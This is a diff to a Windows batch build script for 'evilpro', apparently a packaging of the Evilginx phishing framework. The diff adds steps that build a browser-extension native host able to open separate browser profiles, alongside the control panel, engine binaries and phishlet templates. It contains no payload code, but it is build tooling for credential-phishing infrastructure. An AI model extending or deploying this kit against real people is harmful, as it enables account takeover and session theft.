@@ -28,12 +28,21 @@ go build -mod=mod -o "%OUT%\evilpro-panel-linux" .\controlpanel || goto :err
 set GOOS=darwin
 go build -mod=mod -o "%OUT%\evilpro-panel-mac" .\controlpanel || goto :err
 
-echo [3/6] engine binaries (linux amd64 + arm64)
+echo [4/6] engine binaries (linux amd64 + arm64)
 set GOOS=linux
 set GOARCH=amd64
 go build -mod=mod -o "%OUT%\evilginx-linux" . || goto :err
 set GOARCH=arm64
 go build -mod=mod -o "%OUT%\evilginx-linux-arm64" . || goto :err
+
+echo [4b/6] native host (lets the extension open real, separate browser profiles)
+set GOOS=windows
+set GOARCH=amd64
+go build -mod=mod -o "extension\host\bin\evilpro-host.exe" .\extension\host || goto :err
+set GOOS=linux
+go build -mod=mod -o "extension\host\bin\evilpro-host-linux" .\extension\host || goto :err
+set GOOS=darwin
+go build -mod=mod -o "extension\host\bin\evilpro-host-mac" .\extension\host || goto :err
 
 echo [4/6] phishlets
 copy /y phishlets\*.yaml "%OUT%\phishlets\" >nul || goto :err
